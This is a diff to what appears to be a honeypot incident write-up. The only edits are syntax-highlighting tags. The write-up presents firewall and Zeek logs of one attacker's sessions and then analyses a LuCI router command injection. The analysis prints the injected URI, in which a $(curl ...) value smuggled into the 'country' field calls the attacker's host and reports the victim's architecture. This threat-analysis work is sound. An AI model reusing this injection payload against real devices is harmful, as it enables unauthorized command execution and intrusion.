@@ -13,7 +13,7 @@
 #### The 5 sessions can be seen in dshield.log and conn.log
 
 **dshield.log** shows the following:
-```prolog
+```verilog
 1699501699 BigDshield kernel:[50987.745307]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=2.237.57.70 DST=172.31.5.68 LEN=60 TOS=0x00 PREC=0x00 TTL=46 ID=55359 DF PROTO=TCP SPT=53382 DPT=8080 WINDOW=64240 RES=0x00 SYN URGP=0 
 1699501701 BigDshield kernel:[50989.149093]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=2.237.57.70 DST=172.31.5.68 LEN=60 TOS=0x00 PREC=0x00 TTL=46 ID=353 DF PROTO=TCP SPT=59202 DPT=8080 WINDOW=64240 RES=0x00 SYN URGP=0 
 1699501702 BigDshield kernel:[50990.343019]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=2.237.57.70 DST=172.31.5.68 LEN=60 TOS=0x00 PREC=0x00 TTL=46 ID=64244 DF PROTO=TCP SPT=52980 DPT=8080 WINDOW=64240 RES=0x00 SYN URGP=0 
@@ -21,7 +21,7 @@
 1699501704 BigDshield kernel:[50992.733400]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=2.237.57.70 DST=172.31.5.68 LEN=60 TOS=0x00 PREC=0x00 TTL=46 ID=56344 DF PROTO=TCP SPT=50066 DPT=8080 WINDOW=64240 RES=0x00 SYN URGP=0 
 ```
 **Zeek conn.log** shows the following:
-```prolog
+```verilog
 #fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	proto	service	duration	orig_bytes	resp_bytes	conn_state	local_orig	local_resp	missed_bytes	history	orig_pkts	orig_ip_bytes	resp_pkts	resp_ip_bytes	tunnel_parents
 #types	time	string	addr	port	addr	port	enum	string	interval	count	count	string	bool	bool	count	string	count	count	count	count	set[string]
 1699501701.032478	Ck4N0V3ktsYTefptLi	2.237.57.70	59202	172.31.5.68	8080	tcp	http	0.202757	183	0	SF	F	T	0	ShADaFf	5	451	3	164	-
@@ -44,7 +44,7 @@ Here is a sample of the 3 requests from **webhoneypot-2023-11-09.log**:
 
 ### Notice how the command injection is not visible in the webhoneypot logs.  It is only visible in the Zeek http.log which shows the full URI.
 Zeek http.log shows the following:
-```prolog
+```verilog
 command: 
 cat tests/logs/zeek/http.log | zeek-cut id.orig_h id.orig_p id.resp_h id.resp_p method host uri | grep "2.237.57.70"
 
@@ -68,7 +68,7 @@ curl http://2.237.57.70:81/who=54.67.87.80I$(uname -m);
 
 ## Malware Analysis
 The full URI used in the command injection is the following:
-```
+```bash
  /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(curl http://2.237.57.70:81/who=54.67.87.80I$(uname -m);)
  ```
 The portion of the command ``uname -m`` is used to determine the architecture of the system.  In this case, the architecture is x86_64.  
